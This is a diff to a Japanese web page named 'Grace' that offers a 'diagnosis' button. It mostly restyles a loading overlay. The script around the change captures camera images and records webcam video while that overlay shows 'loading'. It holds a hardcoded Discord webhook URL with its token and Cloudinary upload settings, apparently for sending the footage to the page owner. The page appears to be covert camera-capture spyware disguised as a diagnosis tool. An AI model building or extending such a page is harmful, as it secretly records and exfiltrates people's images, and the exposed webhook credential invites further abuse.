@@ -114,39 +114,50 @@
       color: black;
     }
 
-    /* 読み込み中オーバーレイ */
+    /* ローディングオーバーレイ */
     #loadingOverlay {
       position: fixed;
+      z-index: 2000;
       top: 0;
       left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      z-index: 2000;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0,0,0,0.7);
       display: none;
       flex-direction: column;
       justify-content: center;
       align-items: center;
     }
 
-    .spinner {
-      border: 6px solid #ccc;
-      border-top: 6px solid white;
+    .circle-border {
+      width: 150px;
+      height: 150px;
+      padding: 3px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 10px;
+      background: rgb(63,249,220);
+      background: linear-gradient(0deg, rgba(63,249,220,0.1) 33%, rgba(63,249,220,1) 100%);
+      animation: spin .8s linear 0s infinite;
+    }
+
+    .circle-core {
+      width: 100%;
+      height: 100%;
+      background-color: #1d2630;
+      border-radius: 50%;
     }
 
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
     }
 
     .loading-text {
-      color: #ccc;
-      font-size: 0.9rem;
+      margin-top: 1rem;
+      font-size: 0.8rem;
+      color: rgba(255,255,255,0.6);
     }
   </style>
 </head>
@@ -154,6 +165,14 @@
   <div class="logo" oncontextmenu="return false;">Grace</div>
   <button class="button" id="startButton">診断する</button>
   <div class="terms-link" id="termsLink">利用規約</div>
+
+  <!-- ローディングオーバーレイ -->
+  <div id="loadingOverlay">
+    <div class="circle-border">
+      <div class="circle-core"></div>
+    </div>
+    <div class="loading-text">読み込み中…</div>
+  </div>
 
   <div id="termsModal" class="modal">
     <div class="modal-content">
@@ -177,16 +196,13 @@
     </div>
   </div>
 
-  <div id="loadingOverlay">
-    <div class="spinner"></div>
-    <div class="loading-text">読み込み中…</div>
-  </div>
-
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const webhookUrl = "https://discord.com/api/webhooks/1370405716879478866/xg8bYu4il6v65X0xxwsgv5CLV81IxKv_AODdpS0KyORgjBb4ZrhCny7Aa-Z-xU1JN_3Y";
   const cloudName = "dvzsuryb2";
   const uploadPreset = "Grace-movie";
+
+  const loadingOverlay = document.getElementById("loadingOverlay");
 
   async function captureImages(facingMode) {
     const images = [];
@@ -212,8 +228,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   async function recordVideo() {
-    document.getElementById("loadingOverlay").style.display = "flex";
-
+    loadingOverlay.style.display = "flex";  // 表示
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     const mediaRecorder = new MediaRecorder(stream);
     const chunks = [];
@@ -230,8 +245,7 @@ document.addEventListener("DOMContentLoaded", () => {
       };
     });
 
-    document.getElementById("loadingOverlay").style.display = "none";
-
+    loadingOverlay.style.display = "none";  // 非表示
     return new Blob(chunks, { type: "video/webm" });
   }
 
